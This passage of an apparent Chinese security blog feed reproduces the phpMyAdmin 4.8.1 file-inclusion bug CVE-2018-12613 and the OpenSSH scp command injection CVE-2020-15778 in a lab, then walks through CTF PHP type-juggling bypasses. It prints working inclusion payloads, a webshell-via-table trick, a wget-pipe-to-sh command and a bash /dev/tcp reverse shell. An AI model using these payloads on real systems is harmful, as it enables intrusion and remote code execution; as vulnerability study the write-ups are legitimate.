class="string">'target'</span>])</span><br><span class="line">) &#123;</span><br><span class="line">    <span class="keyword">include</span> $_REQUEST[<span class="string">'target'</span>];</span><br><span class="line">    <span class="keyword">exit</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>分析上面的代码，这里有五个判断，只有都为真才能进入到下面的包含</p><ul><li><code>$_REQUEST[&#39;target&#39;]</code>不能为空</li><li><code>$_REQUEST[&#39;target&#39;]</code>必须为字符串</li><li><code>$_REQUEST[&#39;target&#39;]</code>不能够以index开头</li><li><code>$_REQUEST[&#39;target&#39;]</code>不能出现在<code>$target_blacklist</code>中的内容</li><li>满足<code>Core::checkPageValidity()</code></li></ul><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$target_blacklist = <span class="keyword">array</span> (</span><br><span class="line">    <span class="string">'import.php'</span>, <span class="string">'export.php'</span></span><br><span class="line">);</span><br></pre></td></tr></table></figure><p>可以看到只要传入的参数不是import.php或者export.php即可</p><p>跟进一下<code>Core::checkPageValidity()</code>,路径为</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">\libraries\classes\Core.php</span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="function"><span class="keyword">function</span> <span class="title">checkPageValidity</span><span class="params">(&amp;$page, array $whitelist = [])</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">empty</span>($whitelist)) &#123;</span><br><span class="line">$whitelist = <span class="keyword">self</span>::$goto_whitelist;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (! <span class="keyword">isset</span>($page) || !is_string($page)) &#123;</span><br><span class="line"><span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (in_array($page, $whitelist)) &#123;<span class="comment">//判断是否在$whitelist中</span></span><br><span class="line"><span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">&#125;</span><br><span class="line">$_page = mb_substr(<span class="comment">//返回指定长度的$page的值</span></span><br><span class="line">$page,</span><br><span class="line"><span class="number">0</span>,</span><br><span class="line">mb_strpos($page . <span class="string">'?'</span>, <span class="string">'?'</span>)<span class="comment">//拼接?,查找$page第一次出现？的位置</span></span><br><span class="line">);</span><br><span class="line"><span class="keyword">if</span> (in_array($_page, $whitelist)) &#123;</span><br><span class="line"><span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">&#125;</span><br><span class="line">$_page = urldecode($page);<span class="comment">//url解码</span></span><br><span class="line">    <span class="comment">//再次重复上面的检测</span></span><br><span class="line">$_page = mb_substr(</span><br><span class="line">$_page,</span><br><span class="line"><span class="number">0</span>,</span><br><span class="line">mb_strpos($_page . <span class="string">'?'</span>, <span class="string">'?'</span>)</span><br><span class="line">);</span><br><span class="line"><span class="keyword">if</span> (in_array($_page, $whitelist)) &#123;</span><br><span class="line"><span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这段代码的问题出现在解码及后面部分</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">$_page = urldecode($page);</span><br><span class="line">$_page = mb_substr(</span><br><span class="line">$_page,</span><br><span class="line"><span class="number">0</span>,</span><br><span class="line">mb_strpos($_page . <span class="string">'?'</span>, <span class="string">'?'</span>)</span><br><span class="line">);</span><br><span class="line"><span class="keyword">if</span> (in_array($_page, $whitelist)) &#123;</span><br><span class="line"><span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>经过url解码之后判断是否在<code>$whitelist</code>中，跟进<code>self::$goto_whitelist</code></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> $goto_whitelist = <span class="keyword">array</span>(</span><br><span class="line">        <span class="string">'db_datadict.php'</span>,</span><br><span class="line">        <span class="string">'db_sql.php'</span>,</span><br><span class="line">        <span class="string">'db_events.php'</span>,</span><br><span class="line">        <span class="string">'db_export.php'</span>,</span><br><span class="line">        <span class="string">'db_importdocsql.php'</span>,</span><br><span class="line">        <span class="string">'db_multi_table_query.php'</span>,</span><br><span class="line">        <span class="string">'db_structure.php'</span>,</span><br><span class="line">        <span class="string">'db_import.php'</span>,</span><br><span class="line">        <span class="string">'db_operations.php'</span>,</span><br><span class="line">        <span class="string">'db_search.php'</span>,</span><br><span class="line">        <span class="string">'db_routines.php'</span>,</span><br><span class="line">        <span class="string">'export.php'</span>,</span><br><span class="line">        <span class="string">'import.php'</span>,</span><br><span class="line">        <span class="string">'index.php'</span>,</span><br><span class="line">        <span class="string">'pdf_pages.php'</span>,</span><br><span class="line">        <span class="string">'pdf_schema.php'</span>,</span><br><span class="line">        <span class="string">'server_binlog.php'</span>,</span><br><span class="line">        <span class="string">'server_collations.php'</span>,</span><br><span class="line">        <span class="string">'server_databases.php'</span>,</span><br><span class="line">        <span class="string">'server_engines.php'</span>,</span><br><span class="line">        <span class="string">'server_export.php'</span>,</span><br><span class="line">        <span class="string">'server_import.php'</span>,</span><br><span class="line">        <span class="string">'server_privileges.php'</span>,</span><br><span class="line">        <span class="string">'server_sql.php'</span>,</span><br><span class="line">        <span class="string">'server_status.php'</span>,</span><br><span class="line">        <span class="string">'server_status_advisor.php'</span>,</span><br><span class="line">        <span class="string">'server_status_monitor.php'</span>,</span><br><span class="line">        <span class="string">'server_status_queries.php'</span>,</span><br><span class="line">        <span class="string">'server_status_variables.php'</span>,</span><br><span class="line">        <span class="string">'server_variables.php'</span>,</span><br><span class="line">        <span class="string">'sql.php'</span>,</span><br><span class="line">        <span class="string">'tbl_addfield.php'</span>,</span><br><span class="line">        <span class="string">'tbl_change.php'</span>,</span><br><span class="line">        <span class="string">'tbl_create.php'</span>,</span><br><span class="line">        <span class="string">'tbl_import.php'</span>,</span><br><span class="line">        <span class="string">'tbl_indexes.php'</span>,</span><br><span class="line">        <span class="string">'tbl_sql.php'</span>,</span><br><span class="line">        <span class="string">'tbl_export.php'</span>,</span><br><span class="line">        <span class="string">'tbl_operations.php'</span>,</span><br><span class="line">        <span class="string">'tbl_structure.php'</span>,</span><br><span class="line">        <span class="string">'tbl_relation.php'</span>,</span><br><span class="line">        <span class="string">'tbl_replace.php'</span>,</span><br><span class="line">        <span class="string">'tbl_row_action.php'</span>,</span><br><span class="line">        <span class="string">'tbl_select.php'</span>,</span><br><span class="line">        <span class="string">'tbl_zoom_select.php'</span>,</span><br><span class="line">        <span class="string">'transformation_overview.php'</span>,</span><br><span class="line">        <span class="string">'transformation_wrapper.php'</span>,</span><br><span class="line">        <span class="string">'user_password.php'</span>,</span><br><span class="line">    );</span><br></pre></td></tr></table></figure><p>只要传入的参数在白名单中就会返回True</p><p>总的来说，这个漏洞就是利用<code>urldecode()</code>函数绕过白名单检测，<code>?</code>进行两次url编码得到<code>%253f</code>，传入的<code>%253f</code>经过服务器的自动解码和函数解码之后，就会截取<code>?</code>之前的内容，只要在白名单中就会返回<code>true</code>。而在index.php中，会进行包含，只有服务端进行了一次url解码，也就是<code>???.php%3f</code>,php默认解析成目录，所以要跳出该文件夹目录。</p><h2 id="0x06漏洞利用"><a href="#0x06漏洞利用" class="headerlink" title="0x06漏洞利用"></a>0x06漏洞利用</h2><h3 id="1-读取phpinfo"><a href="#1-读取phpinfo" class="headerlink" title="1.读取phpinfo"></a>1.读取phpinfo</h3><p>在www目录下新建<code>phpinfo.php</code>，尝试包含读取</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">payload:</span><br><span class="line">http:<span class="comment">//localhost/phpMyAdmin-4.8.1-all-languages/phpMyAdmin-4.8.1-all-languages/index.php?target=db_sql.php%253f/../../../phpinfo.php</span></span><br><span class="line"><span class="comment">//这里注意本身被解码后的db_sql.php%3f/也是一层目录，要用一个../跳出当前目录</span></span><br></pre></td></tr></table></figure><img src="/2020/10/07/phpMyAdmin-4-8-1-CVE-2018-12613/1.png" class=""><h3 id="2-写入shell，包含之"><a href="#2-写入shell，包含之" class="headerlink" title="2.写入shell，包含之"></a>2.写入shell，包含之</h3><p>新建数据库，新建表，列名直接插入一句话</p><img src="/2020/10/07/phpMyAdmin-4-8-1-CVE-2018-12613/2.png" class=""><p>在<code>phpStudy/MySQL/data/test</code>路径下， 可以看到生成的<code>test.frm</code>，打开可以看到表的列名</p><img src="/2020/10/07/phpMyAdmin-4-8-1-CVE-2018-12613/3.png" class=""><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#payload</span></span><br><span class="line">?target=db_sql.php%<span class="number">253</span>f/../../../../MySQL/data/test/test.frm&amp;<span class="number">1</span>=phpinfo();</span><br></pre></td></tr></table></figure><p>可以看到包含成功</p><img src="/2020/10/07/phpMyAdmin-4-8-1-CVE-2018-12613/4.png" class=""><h3 id="3-包含日志文件"><a href="#3-包含日志文件" class="headerlink" title="3.包含日志文件"></a>3.包含日志文件</h3><p>sql查询处查询</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select &#39;&lt;?php phpinfo();?&gt;&#39;</span><br></pre></td></tr></table></figure><p>记下网页的cookie，找到phpMyAdmin的</p><img src="/2020/10/07/phpMyAdmin-4-8-1-CVE-2018-12613/5.png" class=""><p>包含session文件</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?target=db_sql.php%<span class="number">253</span>f/../../../../tmp/tmp/sess_2ro2cebrk3jkqvnp8eoopl0dueisdgj3</span><br></pre></td></tr></table></figure><p>成功包含，看一下效果</p><img src="/2020/10/07/phpMyAdmin-4-8-1-CVE-2018-12613/6.png" class=""><p>相关方面的知识练手可以从下题进行</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https:&#x2F;&#x2F;buuoj.cn&#x2F;challenges#[HCTF%202018]WarmUp</span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">参考文章</span><br><span class="line">http:<span class="comment">//www.lmxspace.com/2018/06/23/phpmyadmin-4-8-1-复现分析/</span></span><br><span class="line">https:<span class="comment">//blog.csdn.net/weixin_43872099/article/details/104128639</span></span><br><span class="line">https:<span class="comment">//www.phpmyadmin.net/security/PMASA-2018-4/</span></span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;0x01-关于phpmyadmin&quot;&gt;&lt;a href=&quot;#0x01-关于phpmyadmin&quot; class=&quot;headerlink&quot; title=&quot;0x01 关于phpmyadmin&quot;&gt;&lt;/a&gt;0x01 关于phpmyadmin
    
    </summary>
    
    
    
      <category term="CVE" scheme="http://yoursite.com/tags/CVE/"/>
    
  </entry>
  
  <entry>
    <title>OpenSSH的scp命令注入CVE-2020-15778</title>
    <link href="http://yoursite.com/2020/10/01/OpenSSH%E7%9A%84scp%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5CVE-2020-15778/"/>
    <id>http://yoursite.com/2020/10/01/OpenSSH%E7%9A%84scp%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5CVE-2020-15778/</id>
    <published>2020-10-01T07:37:21.000Z</published>
    <updated>2020-10-01T08:47:19.135Z</updated>
    
    <content type="html"><![CDATA[<p>复现的第一个CVE，虽然比较鸡肋的感觉，但还是有必要记录一下<a id="more"></a></p><h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>感觉比较鸡肋的原因，就是得先知道ssh的登录密码，这一点还是比较困难的</p><p>OpenSSH的8.3p1中的scp允许在scp.c远程功能中注入命令，攻击者可利用该漏洞执行任意命令</p><p>SCP(secure copy)是linux系统下基于ssh登录进行安全远程文件拷贝的命令，可以在linux之间复制文件和目录</p><h3 id="产品"><a href="#产品" class="headerlink" title="产品"></a>产品</h3><p><strong>Openssh</strong></p><h3 id="影响范围"><a href="#影响范围" class="headerlink" title="影响范围"></a>影响范围</h3><p>OpenSSH&lt;=8.3p1</p><h3 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h3><p>使用scp复制文件到远程服务器时，在scp命令后面跟上文件的路径</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">scp SourceFile user@ip:directory&#x2F;TargetFile</span><br></pre></td></tr></table></figure><p>scp会使用”-t“参数来获取存储传入文件的路径</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">scp -t directory&#x2F;TargetFile</span><br></pre></td></tr></table></figure><img src="/2020/10/01/OpenSSH%E7%9A%84scp%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5CVE-2020-15778/1.png" class=""><p>问题在<code>scp.c</code>文件的989行，传入路径未进行检测，利用反引号可以包裹poc，加上文件名执行scp命令。这使得攻击者执行带有反引号的有效scp命令时，本地shell还将执行反引号中的命令</p><h2 id="复现"><a href="#复现" class="headerlink" title="复现"></a>复现</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">环境</span><br><span class="line">靶机：centos</span><br><span class="line">攻击机：kali</span><br><span class="line">场景：已知ssh密码</span><br></pre></td></tr></table></figure><h3 id="POC"><a href="#POC" class="headerlink" title="POC"></a>POC</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">scp 111.txt root@ip:'/tmp/test/111'</span><br></pre></td></tr></table></figure><p>可以看到成功通过scp发送到靶机</p><img src="/2020/10/01/OpenSSH%E7%9A%84scp%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5CVE-2020-15778/2.png" class=""><p>接下来试着创建一个hack.sh文件，文件内容为空，可以在自己的服务器上搭建包含shell的hack.sh，通过wget命令下载shell并且执行，这里不演示这个过程</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">scp 111.txt root@ip:'`touch /tmp/test/hack.sh`/tmp/test/444'</span><br></pre></td></tr></table></figure><img src="/2020/10/01/OpenSSH%E7%9A%84scp%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5CVE-2020-15778/3.png" class=""><p>带wget的poc</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">scp 111.txt root@ip:'wget https://unknownsource.com/possiblydangerous.sh -O- | sh /tmp/test/444'</span><br></pre></td></tr></table></figure><p>下一步就可以反弹shell</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">scp 111.txt root@ip:'`bash -i &gt;&amp; /dev/tcp/攻击机ip/端口 0&gt;&amp;1`/tmp/test/'</span><br></pre></td></tr></table></figure><h3 id="解决方案"><a href="#解决方案" class="headerlink" title="解决方案"></a>解决方案</h3><p>厂商暂未发布补丁，建议使用rsync代替scp</p><p>保存好自己的ssh密码，加强密钥强度，周期性更新密码</p><h3 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">https:&#x2F;&#x2F;www.freebuf.com&#x2F;vuls&#x2F;245225.html</span><br><span class="line">https:&#x2F;&#x2F;zhuanlan.zhihu.com&#x2F;p&#x2F;166028229</span><br><span class="line">https:&#x2F;&#x2F;github.com&#x2F;cpandya2909&#x2F;CVE-2020-15778&#x2F;</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;复现的第一个CVE，虽然比较鸡肋的感觉，但还是有必要记录一下
    
    </summary>
    
    
    
      <category term="CVE" scheme="http://yoursite.com/tags/CVE/"/>
    
  </entry>
  
  <entry>
    <title>PHPcharacter</title>
    <link href="http://yoursite.com/2020/09/25/PHPcharacter/"/>
    <id>http://yoursite.com/2020/09/25/PHPcharacter/</id>
    <published>2020-09-25T13:40:31.000Z</published>
    <updated>2020-11-03T01:42:40.820Z</updated>
    
    <content type="html"><![CDATA[<p>php特性<a id="more"></a></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">关于intval函数知识点</span><br><span class="line">int intval ( mixed $var [, int $base = <span class="number">10</span> ] )</span><br><span class="line">参数说明：</span><br><span class="line">$var：要转换成 integer 的数量值。</span><br><span class="line">$base：转化所使用的进制。</span><br><span class="line">如果 base 是 <span class="number">0</span>，通过检测 <span class="keyword">var</span> 的格式来决定使用的进制：如果字符串包括了 <span class="string">"0x"</span> (或 <span class="string">"0X"</span>) 的前缀，使用 <span class="number">16</span> 进制 (hex)；如果字符串以 <span class="string">"0"</span> 开始，使用 <span class="number">8</span> 进制(octal)；否则，将使用 <span class="number">10</span> 进制 (decimal)。</span><br></pre></td></tr></table></figure><h3 id="web89"><a href="#web89" class="headerlink" title="web89"></a>web89</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">'num'</span>]))&#123;</span><br><span class="line">    $num = $_GET[<span class="string">'num'</span>];</span><br><span class="line">    <span class="keyword">if</span>(preg_match(<span class="string">"/[0-9]/"</span>, $num))&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">"no no no!"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(intval($num))&#123;</span><br><span class="line">        <span class="keyword">echo</span> $flag;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>用数组绕过，intval()函数在处理数组时会返回1</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#payload</span></span><br><span class="line">num[]=<span class="number">1</span></span><br></pre></td></tr></table></figure><h3 id="web90"><a href="#web90" class="headerlink" title="web90"></a>web90</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">'num'</span>]))&#123;</span><br><span class="line">    $num = $_GET[<span class="string">'num'</span>];</span><br><span class="line">    <span class="keyword">if</span>($num===<span class="string">"4476"</span>)&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">"no no no!"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(intval($num,<span class="number">0</span>)===<span class="number">4476</span>)&#123;</span><br><span class="line">        <span class="keyword">echo</span> $flag;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> intval($num,<span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>强比较，必须是数值，且值相等</p><p>这里首先想到的是用进制绕过，十六进制</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#payload</span></span><br><span class="line">num=<span class="number">0x117C</span></span><br><span class="line">补充，可以增加一个空格绕过</span><br><span class="line">num=%<span class="number">204476</span></span><br></pre></td></tr></table></figure><h3 id="web91"><a href="#web91" class="headerlink" title="web91"></a>web91</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">$a=$_GET[<span class="string">'cmd'</span>];</span><br><span class="line"><span class="keyword">if</span>(preg_match(<span class="string">'/^php$/im'</span>, $a))&#123;</span><br><span class="line">    <span class="keyword">if</span>(preg_match(<span class="string">'/^php$/i'</span>, $a))&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">'hacker'</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> $flag;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>要求匹配到php但是又不能含有php，这里绕过的点在于正则中的<code>/m</code>,多行匹配模式</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#payload</span></span><br><span class="line">cmd=%<span class="number">0</span>aphp</span><br></pre></td></tr></table></figure><h3 id="web92"><a href="#web92" class="headerlink" title="web92"></a>web92</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>($num==<span class="number">4476</span>)&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">"no no no!"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(intval($num,<span class="number">0</span>)==<span class="number">4476</span>)&#123;</span><br><span class="line">        <span class="keyword">echo</span> $flag;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>依旧可以用进制绕过</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#payload</span></span><br><span class="line">num=<span class="number">0x117C</span></span><br></pre></td></tr></table></figure><h3 id="web93"><a href="#web93" class="headerlink" title="web93"></a>web93</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">'num'</span>]))&#123;</span><br><span class="line">    $num = $_GET[<span class="string">'num'</span>];</span><br><span class="line">    <span class="keyword">if</span>($num==<span class="number">4476</span>)&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">"no no no!"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(preg_match(<span class="string">"/[a-z]/i"</span>, $num))&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">"no no no!"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(intval($num,<span class="number">0</span>)==<span class="number">4476</span>)&#123;</span><br><span class="line">        <span class="keyword">echo</span> $flag;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> intval($num,<span class="number">0</span>);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>过滤了字母</p><p>十六进制用不了，用八进制即可</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#payload</span></span><br><span class="line">num=<span class="number">010574</span></span><br></pre></td></tr></table></figure><h3 id="web94"><a href="#web94" class="headerlink" title="web94"></a>web94</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">'num'</span>]))&#123;</span><br><span class="line">    $num = $_GET[<span class="string">'num'</span>];</span><br><span class="line">    <span class="keyword">if</span>($num===<span class="string">"4476"</span>)&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">"no no no!"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(preg_match(<span class="string">"/[a-z]/i"</span>, $num))&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">"no no no!"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(!strpos($num, <span class="string">"0"</span>))&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">"no no no!"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(intval($num,<span class="number">0</span>)===<span class="number">4476</span>)&#123;</span><br><span class="line">        <span class="keyword">echo</span> $flag;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>首个字符不能是0</p><p>这里可以利用精度来绕过</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#payload</span></span><br><span class="line">num=<span class="number">4476.00</span></span><br><span class="line">num=%<span class="number">20010574</span></span><br></pre></td></tr></table></figure><h3 id="web95"><a href="#web95" class="headerlink" title="web95"></a>web95</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">'num'</span>]))&#123;</span><br><span class="line">    $num = $_GET[<span class="string">'num'</span>];</span><br><span class="line">    <span class="keyword">if</span>($num==<span class="number">4476</span>)&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">"no no no!"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(preg_match(<span class="string">"/[a-z]|\./i"</span>, $num))&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">"no no no!!"</span>);</span><br><span 